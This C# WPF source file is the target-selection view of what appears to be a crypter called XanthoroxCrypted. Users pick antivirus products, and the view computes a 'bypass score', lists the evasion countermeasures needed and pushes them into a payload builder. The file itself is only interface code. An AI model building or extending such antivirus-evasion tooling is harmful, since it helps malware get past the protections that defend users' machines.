using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Shapes;
using XanthoroxCrypted.Core;

namespace XanthoroxCrypted.Views
{
    public partial class TargetView : UserControl
    {
        private readonly Dictionary<AvProfile, CheckBox> _avCheckBoxes = new();
        private BuilderView _builderView;

        public TargetView()
        {
            InitializeComponent();
            BuildAvGrid(AvDatabase.AllProfiles);
        }

        /// <summary>
        /// Set reference to BuilderView for Apply functionality.
        /// Called from MainWindow after both views are created.
        /// </summary>
        public void SetBuilderView(BuilderView view) => _builderView = view;

        // ═══ AV GRID CONSTRUCTION ═══

        private void BuildAvGrid(IEnumerable<AvProfile> profiles)
        {
            PanelAvGrid.Children.Clear();

            foreach (var av in profiles)
            {
                var card = CreateAvCard(av);
                PanelAvGrid.Children.Add(card);
            }
        }

        private Border CreateAvCard(AvProfile av)
        {
            // Outer card
            var card = new Border
            {
                Width = 230,
                Background = new SolidColorBrush(Color.FromRgb(0x1A, 0x1A, 0x2E)),
                CornerRadius = new CornerRadius(8),
                Padding = new Thickness(12, 10, 12, 10),
                Margin = new Thickness(4),
                BorderBrush = new SolidColorBrush(Color.FromRgb(0x2A, 0x2A, 0x3E)),
                BorderThickness = new Thickness(1),
                Cursor = System.Windows.Input.Cursors.Hand,
            };

            var stack = new StackPanel();

            // Row 1: Checkbox + Name + Threat
            var headerRow = new Grid();
            headerRow.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            headerRow.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
            headerRow.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });

            var chk = new CheckBox
            {
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 6, 0),
            };
            // Apply the toggle style if available
            if (FindResource("Style_Toggle") is Style toggleStyle)
                chk.Style = toggleStyle;

            chk.Checked += (s, e) => OnSelectionChanged();
            chk.Unchecked += (s, e) => OnSelectionChanged();
            _avCheckBoxes[av] = chk;

            Grid.SetColumn(chk, 0);
            headerRow.Children.Add(chk);

            // Name with icon
            var namePanel = new StackPanel { Orientation = Orientation.Horizontal, VerticalAlignment = VerticalAlignment.Center };
            namePanel.Children.Add(new TextBlock
            {
                Text = av.Icon,
                FontSize = 13,
                Margin = new Thickness(0, 0, 6, 0),
                VerticalAlignment = VerticalAlignment.Center,
            });
            namePanel.Children.Add(new TextBlock
            {
                Text = av.Name,
                FontSize = 11.5,
                FontWeight = FontWeights.SemiBold,
                Foreground = (Brush)FindResource("Brush_TextPrimary"),
                VerticalAlignment = VerticalAlignment.Center,
                TextTrimming = TextTrimming.CharacterEllipsis,
            });
            Grid.SetColumn(namePanel, 1);
            headerRow.Children.Add(namePanel);

            // Threat badge
            var threatColor = av.ThreatLevel >= 4 ? Color.FromRgb(0xFF, 0x44, 0x44) :
                              av.ThreatLevel >= 3 ? Color.FromRgb(0xFF, 0x98, 0x00) :
                              Color.FromRgb(0x4C, 0xAF, 0x50);
            var threatBadge = new Border
            {
                Background = new SolidColorBrush(Color.FromArgb(0x30, threatColor.R, threatColor.G, threatColor.B)),
                CornerRadius = new CornerRadius(3),
                Padding = new Thickness(5, 2, 5, 2),
                VerticalAlignment = VerticalAlignment.Center,
            };
            threatBadge.Child = new TextBlock
            {
                Text = AvDatabase.GetThreatLabel(av.ThreatLevel),
                FontSize = 8,
                FontWeight = FontWeights.Bold,
                Foreground = new SolidColorBrush(threatColor),
            };
            Grid.SetColumn(threatBadge, 2);
            headerRow.Children.Add(threatBadge);

            stack.Children.Add(headerRow);

            // Row 2: Engine tags
            var tagPanel = new WrapPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 6, 0, 0) };
            foreach (DetectionEngine engine in Enum.GetValues(typeof(DetectionEngine)))
            {
                if (engine == DetectionEngine.None) continue;
                if (!av.Engines.HasFlag(engine)) continue;

                string shortName = AvDatabase.EngineShortNames.GetValueOrDefault(engine, "?");
                var tag = new Border
                {
                    Background = new SolidColorBrush(Color.FromRgb(0x0D, 0x21, 0x37)),
                    CornerRadius = new CornerRadius(3),
                    Padding = new Thickness(5, 2, 5, 2),
                    Margin = new Thickness(0, 0, 3, 3),
                };
                tag.Child = new TextBlock
                {
                    Text = shortName,
                    FontSize = 8.5,
                    FontWeight = FontWeights.SemiBold,
                    Foreground = new SolidColorBrush(Color.FromRgb(0x00, 0xE5, 0xFF)),
                };
                tagPanel.Children.Add(tag);
            }
            stack.Children.Add(tagPanel);

            // Row 3: Category label
            stack.Children.Add(new TextBlock
            {
                Text = av.Category.ToUpper(),
                FontSize = 8,
                Foreground = (Brush)FindResource("Brush_TextSecondary"),
                Margin = new Thickness(0, 4, 0, 0),
                Opacity = 0.6,
            });

            card.Child = stack;

            // Click anywhere on card to toggle
            card.MouseLeftButtonDown += (s, e) =>
            {
                if (e.OriginalSource is CheckBox) return;
                chk.IsChecked = !(chk.IsChecked ?? false);
            };

            return card;
        }

        // ═══ SELECTION LOGIC ═══

        private void OnSelectionChanged()
        {
            var selected = GetSelectedProfiles();
            var analysis = BypassEngine.Analyze(selected);

            UpdateSelectedCount(selected.Count);
            UpdateScore(analysis);
            UpdateCoverageBars(analysis);
            UpdateCountermeasures(analysis);
            UpdateCardHighlights();

            TxtStatus.Text = selected.Count == 0
                ? "Select target AVs to begin analysis."
                : $"Targeting {selected.Count} AV product{(selected.Count > 1 ? "s" : "")} — " +
                  $"{analysis.RequiredCountermeasures.Count} countermeasure layers required.";
        }

        private List<AvProfile> GetSelectedProfiles()
        {
            return _avCheckBoxes
                .Where(kv => kv.Value.IsChecked == true)
                .Select(kv => kv.Key)
                .ToList();
        }

        // ═══ UI UPDATES ═══

        private void UpdateSelectedCount(int count)
        {
            TxtSelectedCount.Text = $"{count} / {AvDatabase.AllProfiles.Count} SELECTED";
        }

        private void UpdateScore(BypassAnalysis analysis)
        {
            TxtScore.Text = analysis.BypassScore.ToString();

            // Score ring: dash array proportional to score
            double circumference = Math.PI * 120; // πd
            double dashLength = circumference * analysis.BypassScore / 100.0;
            double gapLength = circumference - dashLength;
            ScoreRing.StrokeDashArray = new DoubleCollection(
                new[] { dashLength / 8.0, gapLength / 8.0 }); // divided by thickness

            // Threat badge
            if (analysis.SelectedCount == 0)
            {
                TxtThreat.Text = "NO TARGET";
                TxtThreat.Foreground = new SolidColorBrush(Color.FromRgb(0x88, 0x88, 0x88));
                ThreatBadge.Background = new SolidColorBrush(Color.FromRgb(0x1A, 0x1A, 0x2E));
            }
            else
            {
                TxtThreat.Text = $"MAX THREAT: {AvDatabase.GetThreatLabel(analysis.MaxThreatLevel)}";
                var color = analysis.MaxThreatLevel >= 4
                    ? Color.FromRgb(0xFF, 0x44, 0x44)
                    : analysis.MaxThreatLevel >= 3
                        ? Color.FromRgb(0xFF, 0x98, 0x00)
                        : Color.FromRgb(0x4C, 0xAF, 0x50);
                TxtThreat.Foreground = new SolidColorBrush(color);
                ThreatBadge.Background = new SolidColorBrush(
                    Color.FromArgb(0x30, color.R, color.G, color.B));
            }
        }

        private void UpdateCoverageBars(BypassAnalysis analysis)
        {
            PanelCoverage.Children.Clear();

            foreach (DetectionEngine engine in Enum.GetValues(typeof(DetectionEngine)))
            {
                if (engine == DetectionEngine.None) continue;

                string label = AvDatabase.EngineShortNames.GetValueOrDefault(engine, "?");
                bool isTargeted = analysis.ThreatSurface.HasFlag(engine);
                int coverage = isTargeted ? 100 : 0;

                // Bar row
                var row = new Grid { Margin = new Thickness(0, 0, 0, 7) };
                row.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(52) });
                row.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
                row.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(36) });

                // Label
                var lbl = new TextBlock
                {
                    Text = label,
                    FontSize = 9,
                    FontWeight = FontWeights.SemiBold,
                    Foreground = isTargeted
                        ? (Brush)FindResource("Brush_TextPrimary")
                        : new SolidColorBrush(Color.FromRgb(0x55, 0x55, 0x66)),
                    VerticalAlignment = VerticalAlignment.Center,
                };
                Grid.SetColumn(lbl, 0);
                row.Children.Add(lbl);

                // Bar
                var barBg = new Border
                {
                    Background = new SolidColorBrush(Color.FromRgb(0x1A, 0x1A, 0x2E)),
                    CornerRadius = new CornerRadius(3),
                    Height = 6,
                    Margin = new Thickness(0, 0, 8, 0),
                };
                var barFill = new Border
                {
                    CornerRadius = new CornerRadius(3),
                    Height = 6,
                    HorizontalAlignment = HorizontalAlignment.Left,
                };

                if (isTargeted)
                {
                    barFill.Width = double.NaN; // auto
                    barFill.Background = coverage == 100
                        ? new SolidColorBrush(Color.FromRgb(0x00, 0xE5, 0xFF))
                        : new SolidColorBrush(Color.FromRgb(0xFF, 0x98, 0x00));

                    // We need a grid to overlay
                    var barGrid = new Grid();
                    barGrid.Children.Add(barBg);
                    var fillContainer = new Border
                    {
                        CornerRadius = new CornerRadius(3),
                        Height = 6,
                        HorizontalAlignment = HorizontalAlignment.Left,
                        Background = new SolidColorBrush(Color.FromRgb(0x00, 0xE5, 0xFF)),
                    };
                    // Bind width to percentage (simple approach: use a Grid with column widths)
                    var pctGrid = new Grid();
                    pctGrid.ColumnDefinitions.Add(new ColumnDefinition
                    {
                        Width = new GridLength(coverage, GridUnitType.Star)
                    });
                    pctGrid.ColumnDefinitions.Add(new ColumnDefinition
                    {
                        Width = new GridLength(100 - coverage, GridUnitType.Star)
                    });
                    var pctFill = new Border
                    {
                        Background = new SolidColorBrush(Color.FromRgb(0x00, 0xE5, 0xFF)),
                        CornerRadius = new CornerRadius(3),
                        Height = 6,
                    };
                    Grid.SetColumn(pctFill, 0);
                    pctGrid.Children.Add(pctFill);

                    barGrid.Children.Add(new Border
                    {
                        Background = new SolidColorBrush(Color.FromRgb(0x1A, 0x1A, 0x2E)),
                        CornerRadius = new CornerRadius(3),
                        Height = 6,
                    });
                    barGrid.Children.Add(pctGrid);

                    Grid.SetColumn(barGrid, 1);
                    row.Children.Add(barGrid);
                }
                else
                {
                    Grid.SetColumn(barBg, 1);
                    row.Children.Add(barBg);
                }

                // Percentage
                var pctLabel = new TextBlock
                {
                    Text = isTargeted ? $"{coverage}%" : "—",
                    FontSize = 9,
                    Foreground = isTargeted
                        ? new SolidColorBrush(Color.FromRgb(0x00, 0xE5, 0xFF))
                        : new SolidColorBrush(Color.FromRgb(0x55, 0x55, 0x66)),
                    HorizontalAlignment = HorizontalAlignment.Right,
                    VerticalAlignment = VerticalAlignment.Center,
                };
                Grid.SetColumn(pctLabel, 2);
                row.Children.Add(pctLabel);

                PanelCoverage.Children.Add(row);
            }
        }

        private void UpdateCountermeasures(BypassAnalysis analysis)
        {
            PanelCountermeasures.Children.Clear();

            if (analysis.RequiredCountermeasures.Count == 0)
            {
                PanelCountermeasures.Children.Add(new TextBlock
                {
                    Text = "No targets selected.",
                    FontSize = 10,
                    Foreground = (Brush)FindResource("Brush_TextSecondary"),
                    FontStyle = FontStyles.Italic,
                });
                return;
            }

            foreach (var (engine, cm) in analysis.RequiredCountermeasures)
            {
                var chip = new Border
                {
                    Background = new SolidColorBrush(Color.FromRgb(0x0A, 0x2A, 0x1A)),
                    CornerRadius = new CornerRadius(4),
                    Padding = new Thickness(8, 5, 8, 5),
                    Margin = new Thickness(0, 0, 6, 6),
                    BorderBrush = new SolidColorBrush(Color.FromRgb(0x1A, 0x4A, 0x2E)),
                    BorderThickness = new Thickness(1),
                    ToolTip = cm.Description,
                };

                var chipStack = new StackPanel { Orientation = Orientation.Horizontal };
                chipStack.Children.Add(new TextBlock
                {
                    Text = "✅",
                    FontSize = 9,
                    Margin = new Thickness(0, 0, 5, 0),
                    VerticalAlignment = VerticalAlignment.Center,
                });
                chipStack.Children.Add(new TextBlock
                {
                    Text = cm.Name,
                    FontSize = 9.5,
                    FontWeight = FontWeights.SemiBold,
                    Foreground = new SolidColorBrush(Color.FromRgb(0x4C, 0xAF, 0x50)),
                });
                chip.Child = chipStack;

                PanelCountermeasures.Children.Add(chip);
            }
        }

        private void UpdateCardHighlights()
        {
            foreach (var (av, chk) in _avCheckBoxes)
            {
                var card = (Border)chk.Parent?.GetParentOfType<Border>();
                if (card == null)
                {
                    // Walk up: checkbox → header grid → stack → card border
                    FrameworkElement parent = chk;
                    for (int i = 0; i < 4 && parent != null; i++)
                        parent = parent.Parent as FrameworkElement;
                    card = parent as Border;
                }
                if (card == null) continue;

                if (chk.IsChecked == true)
                {
                    card.BorderBrush = new SolidColorBrush(Color.FromRgb(0x00, 0xE5, 0xFF));
                    card.Background = new SolidColorBrush(Color.FromRgb(0x0D, 0x1F, 0x33));
                }
                else
                {
                    card.BorderBrush = new SolidColorBrush(Color.FromRgb(0x2A, 0x2A, 0x3E));
                    card.Background = new SolidColorBrush(Color.FromRgb(0x1A, 0x1A, 0x2E));
                }
            }
        }

        // ═══ EVENTS ═══

        private void TxtSearch_TextChanged(object sender, TextChangedEventArgs e)
        {
            string filter = TxtSearch.Text?.Trim().ToLowerInvariant() ?? "";

            foreach (var (av, chk) in _avCheckBoxes)
            {
                // Walk up to the card border
                FrameworkElement parent = chk;
                for (int i = 0; i < 4 && parent != null; i++)
                    parent = parent.Parent as FrameworkElement;
                var card = parent as Border;
                if (card == null) continue;

                bool match = string.IsNullOrEmpty(filter) ||
                             av.Name.ToLowerInvariant().Contains(filter) ||
                             av.Category.ToLowerInvariant().Contains(filter);

                card.Visibility = match ? Visibility.Visible : Visibility.Collapsed;
            }
        }

        private void BtnSelectAll_Click(object sender, RoutedEventArgs e)
        {
            foreach (var chk in _avCheckBoxes.Values)
                chk.IsChecked = true;
        }

        private void BtnClear_Click(object sender, RoutedEventArgs e)
        {
            foreach (var chk in _avCheckBoxes.Values)
                chk.IsChecked = false;
        }

        private void BtnApply_Click(object sender, RoutedEventArgs e)
        {
            var selected = GetSelectedProfiles();
            if (selected.Count == 0)
            {
                TxtStatus.Text = "⚠ No AVs selected — nothing to apply.";
                return;
            }

            var analysis = BypassEngine.Analyze(selected);
            var config = BypassEngine.ComputeConfig(analysis.ThreatSurface);

            // Apply to BuilderView if reference is set
            if (_builderView != null)
            {
                _builderView.ApplyFromTargetMatrix(config);
                TxtStatus.Text = $"✅ Applied {analysis.RequiredCountermeasures.Count} layers " +
                                 $"for {selected.Count} targeted AV{(selected.Count > 1 ? "s" : "")}. " +
                                 $"Switch to Builder tab to verify.";
            }
            else
            {
                TxtStatus.Text = "⚠ Builder view reference not set. Please switch to Builder tab manually.";
            }
        }
    }

    // Helper extension
    internal static class VisualTreeHelpers
    {
        public static T GetParentOfType<T>(this DependencyObject child) where T : DependencyObject
        {
            var parent = VisualTreeHelper.GetParent(child);
            while (parent != null)
            {
                if (parent is T typed) return typed;
                parent = VisualTreeHelper.GetParent(parent);
            }
            return null;
        }
    }
}
